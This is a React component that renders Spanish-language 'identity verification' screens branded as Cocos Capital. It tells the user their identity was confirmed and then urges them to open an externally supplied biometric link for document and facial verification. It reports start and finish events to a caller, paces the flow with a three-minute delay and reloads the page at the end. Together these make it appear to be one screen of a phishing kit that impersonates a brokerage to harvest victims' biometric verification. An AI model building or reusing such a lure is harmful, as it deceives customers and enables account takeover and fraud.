import { useEffect, useState } from "react";
import { ShieldCheck, Clock, CheckCircle2, ExternalLink, Copy, Check, Smartphone } from "lucide-react";
import CocosLogo from "@/components/cocos/CocosLogo";

interface CocosV2BiometricScreenProps {
  email: string;
  fullName: string;
  biometricUrl: string;
  onEvent?: (event: string) => void;
}

const CocosV2BiometricScreen = ({ email, fullName, biometricUrl, onEvent }: CocosV2BiometricScreenProps) => {
  const [visible, setVisible] = useState(false);
  const [verificationStarted, setVerificationStarted] = useState(false);
  const [showFinishBtn, setShowFinishBtn] = useState(false);
  const [copied, setCopied] = useState(false);
  const firstName = fullName?.split(" ")?.[0] || "";

  useEffect(() => {
    const t = setTimeout(() => setVisible(true), 100);
    return () => clearTimeout(t);
  }, []);

  useEffect(() => {
    if (!verificationStarted) return;
    const t = setTimeout(() => setShowFinishBtn(true), 3 * 60 * 1000);
    return () => clearTimeout(t);
  }, [verificationStarted]);

  const handleCopyLink = async () => {
    try {
      await navigator.clipboard.writeText(biometricUrl);
      setCopied(true);
      setTimeout(() => setCopied(false), 2500);
    } catch { /* fallback */ }
  };

  const handleStartVerification = () => {
    window.open(biometricUrl, "_blank", "noopener,noreferrer");
    setVerificationStarted(true);
    onEvent?.("biometric_started");
  };

  const handleFinish = () => {
    onEvent?.("biometric_finished");
    window.location.reload();
  };

  if (verificationStarted) {
    return (
      <div className={`w-full max-w-[520px] transition-all duration-500 ${visible ? "opacity-100" : "opacity-0"}`}>
        <div className="flex justify-center mb-4">
          <CocosLogo />
        </div>

        <div className="rounded-2xl bg-white shadow-[0_8px_32px_-8px_rgba(26,63,143,0.12)] border border-[#e8edf5] overflow-hidden">
          <div className="h-1 w-full bg-gradient-to-r from-[#16a34a] via-[#22c55e] to-[#16a34a]" />

          <div className="px-6 py-8 text-center">
            <div className="flex justify-center mb-4">
              <div className="relative">
                <div className="absolute -inset-3 rounded-full bg-blue-100/50 animate-pulse" />
                <div className="relative flex h-16 w-16 items-center justify-center rounded-full bg-gradient-to-br from-[#1a3f8f] to-[#2563eb] shadow-lg">
                  <ShieldCheck size={32} className="text-white" strokeWidth={1.8} />
                </div>
              </div>
            </div>
            <h3 className="text-[17px] font-bold text-[#1a2233] mb-2">Verificación en curso</h3>
            <p className="text-[13px] text-[#5a6a85] leading-relaxed mb-4 max-w-[320px] mx-auto">
              Completa la verificación en la pestaña que se abrió. Cuando termines, volvé acá y presioná el botón de abajo.
            </p>

            <button
              onClick={() => window.open(biometricUrl, "_blank", "noopener,noreferrer")}
              className="text-[13px] text-[#1a3f8f] underline underline-offset-2 hover:text-[#2563eb] mb-3 inline-block"
            >
              ¿No se abrió? Haz clic acá
            </button>

            {/* Mobile copy-link section */}
            <div className="mt-2 rounded-xl border border-[#e8edf5] bg-[#f8fafc] px-4 py-3">
              <div className="flex items-center gap-2 mb-2">
                <Smartphone size={14} className="text-[#5a6a85]" />
                <span className="text-[12px] font-semibold text-[#5a6a85]">¿Estás desde el celular?</span>
              </div>
              <p className="text-[11px] text-[#8895aa] leading-relaxed mb-2.5">
                Copiá el enlace y completá la verificación desde tu navegador móvil para una mejor experiencia.
              </p>
              <button
                onClick={handleCopyLink}
                className={`flex items-center justify-center gap-2 w-full rounded-lg py-2.5 text-[13px] font-semibold transition-all ${
                  copied
                    ? "bg-[#f0fdf4] border border-[#bbf7d0] text-[#16a34a]"
                    : "bg-white border border-[#d8dfe8] text-[#1a2233] hover:border-[#3b6fe0] hover:text-[#3b6fe0]"
                }`}
              >
                {copied ? (
                  <>
                    <Check size={14} />
                    ¡Enlace copiado!
                  </>
                ) : (
                  <>
                    <Copy size={14} />
                    Copiar enlace de verificación
                  </>
                )}
              </button>
            </div>
          </div>

          <div className="px-6 py-4 border-t border-[#e8edf5]">
            {showFinishBtn ? (
              <button
                onClick={handleFinish}
                className="flex items-center justify-center gap-2 w-full rounded-xl bg-gradient-to-r from-[#16a34a] to-[#22c55e] py-3.5 text-[14px] font-bold text-white transition-all hover:from-[#15803d] hover:to-[#16a34a] active:scale-[0.98] shadow-md shadow-green-200"
              >
                <CheckCircle2 size={18} />
                Ya completé la verificación
              </button>
            ) : (
              <div className="flex items-center justify-center gap-2 text-[13px] text-[#8895aa]">
                <Clock size={14} className="animate-pulse" />
                <span>Completá la verificación en la otra pestaña...</span>
              </div>
            )}
          </div>
        </div>

        <div className="flex justify-center mt-3">
          <div className="flex items-center gap-2 rounded-full border border-[#e8edf5] bg-[#f8fafc] px-4 py-2">
            <div className="h-1.5 w-1.5 rounded-full bg-[#16a34a]" />
            <span className="text-[12px] text-[#8895aa] max-w-[220px] truncate">{email}</span>
          </div>
        </div>
      </div>
    );
  }

  return (
    <div className={`w-full max-w-[480px] transition-all duration-700 ${visible ? "opacity-100 translate-y-0" : "opacity-0 translate-y-6"}`}>
      <div className="flex justify-center mb-6">
        <CocosLogo />
      </div>

      {/* Success badge */}
      <div className="flex justify-center mb-6">
        <div className="relative">
          <div className="absolute -inset-3 rounded-full bg-green-100/50 animate-pulse" />
          <div className="relative flex h-20 w-20 items-center justify-center rounded-full bg-gradient-to-br from-[#16a34a] to-[#22c55e] shadow-xl shadow-green-200">
            <CheckCircle2 size={40} className="text-white" strokeWidth={1.8} />
          </div>
        </div>
      </div>

      <h2 className="text-center text-[20px] font-extrabold text-[#1a2233] mb-2 leading-tight">
        ¡Gracias por la verificación{firstName ? `, ${firstName}` : ""}!
      </h2>
      <p className="text-center text-[14px] text-[#5a6a85] leading-relaxed mb-6 max-w-[340px] mx-auto">
        Tu identidad fue confirmada correctamente.
      </p>

      {/* Verification card */}
      <div className="rounded-2xl bg-white shadow-[0_8px_32px_-8px_rgba(26,63,143,0.12)] border border-[#e8edf5] overflow-hidden mb-6">
        <div className="h-1 w-full bg-gradient-to-r from-[#16a34a] via-[#22c55e] to-[#16a34a]" />
        <div className="px-6 py-5">
          <div className="flex items-start gap-3 mb-4">
            <ShieldCheck size={20} className="text-[#1a3f8f] flex-shrink-0 mt-0.5" />
            <div>
              <h4 className="text-[15px] font-bold text-[#1a2233] mb-1">Validación de documentos</h4>
              <p className="text-[13px] text-[#5a6a85] leading-relaxed">
                Para garantizar la <strong>seguridad de tu cuenta</strong> y la protección de tus fondos,
                necesitamos una verificación rápida de tus documentos de identidad.
              </p>
            </div>
          </div>

          <div className="space-y-2 mb-4">
            {[
              "Verificación de identidad con documento oficial",
              "Reconocimiento facial rápido y seguro",
              "Protección contra accesos no autorizados",
            ].map((text) => (
              <div key={text} className="flex items-center gap-2.5">
                <span className="w-4 h-4 rounded-full bg-[#16a34a] flex items-center justify-center flex-shrink-0">
                  <svg className="w-2.5 h-2.5 text-white" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                    <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={3} d="M5 13l4 4L19 7" />
                  </svg>
                </span>
                <span className="text-[13px] text-[#333]">{text}</span>
              </div>
            ))}
          </div>

          <div className="flex items-center gap-2 text-[12px] text-[#8895aa] mb-5">
            <Clock size={14} />
            <span>Este proceso toma menos de 5 minutos</span>
          </div>

          <button
            onClick={handleStartVerification}
            className="flex items-center justify-center gap-2 w-full rounded-xl bg-gradient-to-r from-[#1a3f8f] to-[#2563eb] py-3.5 text-[14px] font-bold text-white transition-all hover:from-[#15357a] hover:to-[#1d55d4] active:scale-[0.98] shadow-md shadow-[#1a3f8f]/20"
          >
            Iniciar verificación
            <ExternalLink size={16} />
          </button>
        </div>
      </div>

      <div className="flex justify-center mb-3">
        <div className="flex items-center gap-2 rounded-full border border-[#e8edf5] bg-[#f8fafc] px-4 py-2">
          <div className="h-1.5 w-1.5 rounded-full bg-[#16a34a]" />
          <span className="text-[12px] text-[#8895aa] max-w-[220px] truncate">{email}</span>
        </div>
      </div>

      <p className="text-center text-[11px] text-[#b0b8c9] leading-relaxed max-w-[320px] mx-auto">
        🔐 Una vez completada la verificación, tu cuenta quedará totalmente habilitada y lista para operar.
        Cocos Capital se compromete a proteger tu información personal.
      </p>
    </div>
  );
};

export default CocosV2BiometricScreen;
